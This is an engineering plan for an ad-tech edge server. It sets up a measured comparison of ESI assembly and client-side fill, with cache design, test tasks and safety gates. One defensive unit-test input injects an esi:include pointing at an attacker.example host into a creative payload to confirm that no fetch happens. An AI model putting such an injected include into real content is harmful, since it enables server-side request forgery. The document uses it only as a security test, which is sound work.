# #1009 ESI Validation Spike

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development
> (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps
> use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Decide #1009 on evidence. Build a shared-template pipeline behind a flag, run
ESI and client-fill against it, and produce a decision record that either adopts ESI,
adopts client-fill, or rejects both — with the Fastly-only maintenance cost priced in.

**Architecture:** `origin → lol_html transform → fastly::cache::core → assemble → finalize`.
The transform emits `esi:include` markers at the two existing injection seams instead of
inlining per-user data. The cached object is a shared template with no per-user bytes.
Assembly is either the `esi` crate (edge) or a client fetch of `/_ts/page-bids` (browser),
selected per request by config so both can be measured on one build.

**Tech Stack:** Rust 2024, `wasm32-wasip1`, `fastly` 0.12.1 (`cache::core`, `http::purge`),
`esi` 0.7, `lol_html`, a real Fastly test service for cache behaviour.

**Spec:** `docs/superpowers/specs/2026-08-08-esi-cacheable-root-validation-design.md` —
read the 2026-08-10 correction at the top and
[§6.6](../specs/2026-08-08-esi-cacheable-root-validation-design.md#66-the-esi-pipeline-corrected)
before writing any code.

**Control:** [the Stage 0 plan](./2026-08-08-1009-measurement-and-stage-0.md). Its
instrumentation and its bypass flag are prerequisites — this plan compares against them
and does not duplicate them.

---

## Why this plan exists

An earlier revision of the spec concluded ESI was structurally impossible. It was wrong:
`fastly::cache::core` provides the cache boundary natively, and purge runs inside Compute.
That correction reopens #1009 as an empirical question, and this plan is how it gets
answered.

**What is genuinely uncertain**, and what each arm is for:

1. Does a shared template plus per-request assembly beat today's inline path enough to
   matter?
2. Does **edge** assembly (ESI) beat **client** assembly (a fetch) by enough to justify a
   Fastly-only rendering path that must be maintained alongside the portable one?
3. Can per-user leakage be excluded across cold MISS, warm HIT, stale revalidation,
   transform failure, and fragment failure?

Question 3 is a gate, not a metric. A win on 1 and 2 with a failure on 3 is a rejection.

## Three caches, never conflated

The original error came from treating these as one thing. Every task below names which it
means.

| #   | Cache                             | Contents                      | Status                              |
| --- | --------------------------------- | ----------------------------- | ----------------------------------- |
| C1  | Origin read-through               | raw origin bytes              | Exists. Stage 0 turns it back on.   |
| C2  | Shared transformed template       | post-`lol_html`, pre-assembly | **New.** What this plan builds.     |
| C3  | Assembled-response delivery cache | final per-user output         | **Must never exist.** Not proposed. |

If a task appears to require C3, stop — that is the leakage failure mode, not a design
option.

## Arms

Five, but only four are treatable as equivalent.

| Arm     | Root                    | Bids             | Notes                                                      |
| ------- | ----------------------- | ---------------- | ---------------------------------------------------------- |
| **A0**  | inline, C1 bypassed     | inline `</body>` | Today. The baseline.                                       |
| **A1**  | inline, C1 on           | inline `</body>` | Stage 0. Isolates the bypass from the template change.     |
| **A2**  | shared template from C2 | client fetch     | Portable. Works on all four adapters.                      |
| **A3**  | shared template from C2 | ESI at the edge  | Fastly-only. The thing #1009 proposed.                     |
| **REF** | origin direct, TS off   | publisher's own  | **Reference, not an arm.** Different work, not comparable. |

A0→A1 measures the bypass. A1→A2 measures the template split. A2→A3 measures edge versus
client assembly — **that difference is the entire case for ESI**, and it is the number
this plan exists to produce.

REF is included because #1009 anchors on it, and excluded from pass/fail because TS-off
does no auction and no injection. Comparing against it measures the feature's existence,
not its implementation.

---

## Task order and dependencies

```
Stage 0 plan (flag + timing instrumentation)  ──┐
                                                ├──> Task 3 (C2 template cache)
Task 1 (esi crate compiles)  ───────────────────┤
Task 2 (test service + harness) ────────────────┘         │
                                                          ├──> Task 4 (A2 client-fill)
                                                          ├──> Task 5 (A3 ESI)
                                                          └──> Task 6 (safety gates)
                                                                     │
                                                                     └──> Task 7 (decision record)
```

Tasks 1 and 2 are independent and should run first — both can invalidate the plan
cheaply. Task 6 runs against every arm, not once at the end.

---

## Task 1: Confirm `esi` 0.7 builds on this toolchain

Cheapest possible falsification. Do this before anything else.

**Files:** `crates/trusted-server-adapter-fastly/Cargo.toml`

- [ ] **Step 1: Add the dependency**

```bash
cargo add esi@0.7 --package trusted-server-adapter-fastly
```

It belongs in the **Fastly adapter**, never in `trusted-server-core` — the crate is
hard-bound to `fastly::{Request, Response, Backend}` and core must stay portable.

- [ ] **Step 2: Check it compiles for the real target**

```bash
cargo check-fastly
```

Expected: clean. The crate declares edition 2021 with no `rust-version`, and pulls recent
`rand` and `nom`, so this is a genuine question on Rust 1.95.0 / `wasm32-wasip1`.

- [ ] **Step 3: Check the lockfiles have not desynced**

```bash
git diff --stat Cargo.lock
cargo test --manifest-path crates/trusted-server-integration-tests/Cargo.toml --test parity
```

CI requires shared direct deps to match between the root and integration-tests lockfiles.
`regex`, `bytes`, and `log` overlap. If they desync, fix with targeted
`cargo update -p <crate> --precise <version>` — **never a full update**.

- [ ] **Step 4: Record and commit, or stop**

If Step 2 fails, this plan stops here and #1009 is answered "not on this toolchain."
Record that in the findings document and escalate rather than fighting the build.

```bash
git add crates/trusted-server-adapter-fastly/Cargo.toml Cargo.lock
git commit -m "Add the esi crate to the Fastly adapter for the #1009 validation spike"
```

---

## Task 2: Stand up the test service and the harness

**Viceroy 0.17 cannot exercise the `cache::core` hooks end to end.** Unit tests cover the
transform and the security properties; MISS / HIT / stale / shielding must run on a real
Fastly service. Establish that before building, or Tasks 3–6 have nowhere to run.

- [ ] **Step 1: Provision a dedicated test service**

Separate from production. Confirm and record: whether the publisher backend is
**shielded**, and whether any Delivery service fronts the Compute service. Both change
what the numbers mean.

```bash
fastly service list
fastly backend list --service-id <test-id> --version latest
```

The shielding answer also settles an open question from the Stage 0 findings: #1009's
off-TS win came from a shield HIT, so whether the test service has one determines whether
its numbers transfer to production at all.

- [ ] **Step 2: Extend the harness for correlation**

The existing tester-cookie A/B has no way to join server timings to browser timings. Add
a per-request correlation ID — generated at TS entry, echoed in an `x-ts-request-id`
response header, and included in every timing log line.

Without it, the experiment cannot join hold time, origin time, auction telemetry, browser
TTFB, and render outcome for the same request. **That is the difference between an
experiment and a pile of numbers.**

- [ ] **Step 3: Capture cache tier and status per request**

Record `x-cache`, `hit-state`, `age`, and the serving POP alongside each measurement. A
median that mixes cold-MISS and warm-HIT requests is meaningless, and arms cannot be
compared unless the mix is known.

- [ ] **Step 4: Define the sample plan before collecting anything**

State, in the findings document, ahead of time: requests per arm per route, how cold MISS
is forced, how warm HIT is confirmed, and the confidence interval to be reported.

Rationale: this whole effort exists because #1009 drew a causal conclusion from N=4 that
did not survive contact with the code. Repeating that with more arms would be worse, not
better.

---

## Task 3: Build C2 — the shared transformed-template cache

The core of the spike. Behind a flag, default off.

**Files:**

- `crates/trusted-server-core/src/publisher.rs` — emit markers at the two seams
- `crates/trusted-server-core/src/settings.rs` — the mode flag
- `crates/trusted-server-adapter-fastly/src/` — the `cache::core` read/write

- [ ] **Step 1: Add the assembly-mode setting**

```rust
/// How per-user ad state reaches the page.
///
/// `Inline` is today's behaviour: bids injected before `</body>`, root uncacheable.
/// `ClientFill` and `Esi` both serve a shared template from the transformed-template
/// cache and fill the holes afterwards. Spike-only — remove with the spike.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Deserialize, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum AssemblyMode {
    #[default]
    Inline,
    ClientFill,
    Esi,
}
```

Default `Inline` so the flag is a no-op until set. Note the hazards the Stage 0 plan
already documents: `Settings` carries `#[serde(deny_unknown_fields)]`, `ts config push` is
typed, and `Publisher` has a hand-written `Default` plus eight exhaustive test literals
and a live doctest.

- [ ] **Step 2: Emit markers instead of inlining, under `ClientFill`/`Esi`**

The two seams are already isolated — that is #1009's correct observation. At head-open,
`tsjs.adSlots` is **per-URL and stays in the template** (config- and path-derived only,
`publisher.rs:3501-3525`). At body-close, emit a marker instead of the bids script.

Under `Esi`: `<esi:include src="/_ts/page-bids?path=…" />`.
Under `ClientFill`: nothing at all — **not an empty bids script.** The Stage 0 plan
explains why: an empty script calls `scheduleInitialAdInit({})` and assigns
`ts.bids = {}` synchronously, racing the client fetch.

**Assert the template carries no per-user bytes.** A unit test over the transform output
must fail on any of: a bid value, an EC ID, a consent string, a geo value, or a
`Set-Cookie`. This is the test that makes C2 safe, and it is cheaper to write now than to
retrofit.

- [ ] **Step 3: Write the template into C2**

```rust
// Fastly adapter. Key on the same signals the origin varies on, plus TS's own
// variant inputs. Surrogate-key it so rollback can purge rather than wait.
let mut insert = fastly::cache::core::insert(cache_key, template_ttl);
insert.surrogate_keys([&surrogate_key_for_url, "ts-template"]);
let mut body = insert.execute()?;
// stream the lol_html output into `body`
```

Use `cache::core::Transaction` with `must_insert()` for the lookup, so a cold cache under
load transforms once rather than per concurrent request.

**Cache key must include** everything the origin's `Vary` names — `rsc`,
`next-router-state-tree`, `next-router-prefetch`, `next-router-segment-prefetch`,
`Accept-Encoding` (measured, see the Stage 0 findings) — **plus** TS's own per-variant
inputs: request host and scheme, the enabled-integration set, and the tsjs content hash.
Per-user signals must never appear in the key; they must be absent from the template
instead. If a signal cannot be excluded from the template, it does not belong in C2.

Set `template_ttl` deliberately short for the spike. A short TTL bounds every failure mode
here and costs only hit rate.

- [ ] **Step 4: Read it back and assemble**

On `found()`, skip the origin fetch and the transform entirely; hand the cached body to
the assembler. On miss, transform and insert as above, then assemble from what was
inserted.

- [ ] **Step 5: Unit tests, then the target suite**

```bash
cargo test -p trusted-server-core --target aarch64-apple-darwin assembly_mode
cargo test-fastly && cargo test-axum && cargo test-cloudflare && cargo test-spin
cargo fmt --all -- --check && cargo clippy-fastly
```

`ClientFill` must work on all four adapters. `Esi` is Fastly-only and must not break the
others' compilation.

---

## Task 4: Arm A2 — client-fill

Mostly already specified. See
[the spec's Appendix B](../specs/2026-08-08-esi-cacheable-root-validation-design.md#appendix-b--stage-1-plumbing-condensed)
for the client plumbing, the two-condition join gate, and the server contract; and
[§5](../specs/2026-08-08-esi-cacheable-root-validation-design.md#5-the-trap-in-the-deferred-work--read-this-before-scheduling-stages-12)
for the silent-empty-bids trap, which applies in full.

- [ ] **Step 1: Hoist the closure-trapped client state** — `pageBidsEndpoint`,
      `requestPageBids`, and the `inflight`/`currentPath`/`lastAppliedPath` state, per
      Appendix B. Do **not** route the initial load through `onNavigate`.
- [ ] **Step 2: Make `installScheduleInitialAdInit` a hydration-ready AND bids-settled
      join**, with a bounded timeout that fires `adInit` untargeted rather than stranding
      the slot. Derive the timeout from measured fetch latency, not a constant.
- [ ] **Step 3: Suppress the navigation-path dispatch** so exactly one auction runs per
      pageview. Add a new `AuctionSource` for initial loads **plus the mechanism that
      delivers it** — a header behind the same-origin gate, not a query parameter.
- [ ] **Step 4: Relocate terminal telemetry.** Navigation `Completed` is emitted only from
      the collect functions; the `ts-debug` dump rides the same string. Both move.
- [ ] **Step 5: Verify exactly one auction per pageview** in `auction_events_raw`. Two is
      a doubling of SSP spend and an immediate fail.

---

## Task 5: Arm A3 — ESI at the edge

- [ ] **Step 1: Wire `process_stream`, not the wrappers**

`process_response` and `process_response_streaming` consume `self` _and_ send the response
themselves, which takes ownership away from the finalize / `ec_finalize` / apply-effects
ordering. `process_stream(&mut self, src: impl BufRead, out: &mut impl Write, …)` keeps it.

Source is the C2 body. Sink is the response body on the way to the client — so EC cookie,
geo, and the privacy net still run **after** assembly. Confirm that ordering explicitly;
it is the difference between a correct response and a leaked one.

- [ ] **Step 2: Disable DCA explicitly and allowlist the dispatcher**

```rust
let config = esi::Configuration::default()
    .with_escaped(false);
// default_dca and inherit_parent_dca stay at DcaMode::None / false — set them
// explicitly rather than relying on defaults; this is a pre-1.0 crate and the
// setting fails open.
```

The dispatcher must be **exact-path allowlisted**: a fragment URL that is not the bids
endpoint is refused, not fetched. The built-in dispatcher builds a dynamic backend per URL
host and panics on a hostless URL — never use it.

Rationale in the spec's §2: bid payloads carry partner-controlled creative markup, so a
recursive parse would let an SSP make the edge fetch an arbitrary URL. **Add a unit test
that feeds `<esi:include src="http://attacker.example/">` through a creative payload and
asserts no fetch is attempted.**

- [ ] **Step 3: Deterministic synthetic fragment first**

Before the real auction, point the include at a fixed-content endpoint. This separates
"does the pipeline assemble correctly" from "does the auction behave," and the two fail
very differently. Only once assembly is proven does the include move to
`/_ts/page-bids`.

- [ ] **Step 4: Handle the flush hazard**

`esi` flushes its output writer after each parse batch. Fastly's `StreamingBody` is a
`BufWriter`, so anything between esi and it must propagate `flush()` or nothing leaves the
Wasm heap.

- [ ] **Step 5: Fragment failure must degrade, not break**

Assert that a fragment timeout or non-2xx yields a page with empty bids rather than a 5xx
or a truncated document. Note the crate's non-obvious semantics: `alt` is attempted before
`onerror="continue"`, and `<esi:try>` runs **all** attempts and concatenates every
non-failed output — it is not first-success-wins.

---

## Task 6: Safety gates — run against every arm

Not a phase. Every one of these is a hard fail, independent of any performance result.

- [ ] **Zero cross-user leakage.** Request the same URL as two synthetic users differing
      in consent state, EC identity, and geo. Assert the C2 template is byte-identical
      and that no bid, EC ID, consent string, or geo value appears in it.
- [ ] **Cold MISS, warm HIT, stale revalidation** each produce a correct page.
- [ ] **Transform failure** (the 16 MB buffer cap, a malformed body) does not insert a
      partial template into C2 and does not serve one.
- [ ] **Request collapsing** works: concurrent cold requests transform once.
- [ ] **DCA disabled**, verified by the injection test in Task 5 Step 2.
- [ ] **Exactly one auction per pageview**, from `auction_events_raw`.
- [ ] **Cookie and privacy finalization still run** after assembly — EC `Set-Cookie` on
      first visit, and the privacy net downgrading it. This is the ordering that ESI's
      streaming mode makes easy to get wrong, since it drops `$add_header`.
- [ ] **Slot and bid attribution unchanged.** Same slots matched, same bids applied, same
      renders attributed. Use TS-attributed renders — the SSAT line item, non-empty
      `ts.bids`, `hb_adid` presence — **never slot fill**, which is blind to empty bids
      because `adInit` defines slots regardless.
- [ ] **No C3.** Assert the final assembled response is never shared-cacheable: no
      `public`, no `s-maxage`, no `Surrogate-Control` on a response carrying per-user
      state.

---

## Task 7: The decision record

**Files:** `docs/superpowers/plans/2026-08-10-1009-esi-decision-record.md`

- [ ] **Step 1: Record every arm** with N, confidence interval, cache-tier mix, route mix,
      and POP. Any arm missing those is not reportable.

- [ ] **Step 2: Apply the decision rule, stated here before the data exists**

**Adopt ESI only if all three hold:**

1. Every Task 6 gate passes on A3.
2. A3 beats A2 on TTFB by a margin the reviewers ratify **before** collection — not
   chosen after seeing the numbers.
3. Render outcomes on A3 are non-inferior to A0.

**Otherwise adopt A2 (client-fill)** if its gates pass and it beats A1. It is portable
across all four adapters and carries no Fastly-only maintenance burden.

**Otherwise keep A1** — Stage 0 alone — and record #1009 as answered in the negative with
evidence.

The margin in (2) exists because A3's cost is not its diff. It is a second rendering
architecture, Fastly-only, on a pre-1.0 crate, in the critical render path. A small win
does not pay for that.

- [ ] **Step 3: Record what would change the answer**, so this does not get re-litigated
      from scratch. At minimum: React #418 / [#938](https://github.com/IABTechLab/trusted-server/issues/938)
      being fixed such that `adInit` can run synchronously, which is what would make edge
      assembly's round-trip saving actually worth something.

- [ ] **Step 4: Clean up.** Remove the spike flag or promote it to a real setting; purge
      C2 (`purge_surrogate_key` on `ts-template`); remove the synthetic fragment endpoint;
      and either land or delete the `esi` dependency. **A spike flag left in place becomes
      permanent configuration surface.**

---

## Reproducibility metadata

Record with every result, or it cannot be re-run or trusted: commit SHA; `esi` and
`fastly` crate versions; Fastly service and version IDs; whether the backend is shielded;
`template_ttl`; the origin's `Cache-Control` and `Vary` at collection time; assembly mode;
routes; N per arm; and the cache-tier mix.

## Out of scope

- **Stages 1–2 of the spec** as production work. This spike may build parts of the
  client-fill path to measure it; shipping it is a separate decision behind the
  correctness defects.
- **Full RSC/flight partitioning.** `rsc_flight.rs` has no static/dynamic split.
- **Publisher-authored ESI.** Breaks the no-origin-changes promise.
- **A C3 delivery cache.** Not a deferred item — a thing that must not exist.

## Definition of done

- [ ] Task 1 verdict recorded: `esi` 0.7 builds on Rust 1.95.0 / `wasm32-wasip1`, or it
      does not and the spike stopped.
- [ ] All four arms measured on one build, with correlation IDs joining server and browser
      timings, and cache tier recorded per request.
- [ ] Every Task 6 gate has an explicit pass/fail per arm.
- [ ] Decision record exists, applies the pre-ratified rule, and names what would change
      the answer.
- [ ] Cleanup complete: flag resolved, C2 purged, synthetic endpoint removed, dependency
      landed or dropped.
- [ ] All CI gates pass: `cargo fmt --all -- --check`; the six clippy targets; the four
      adapter test suites; the parity suite; JS build, test, and format; docs format.
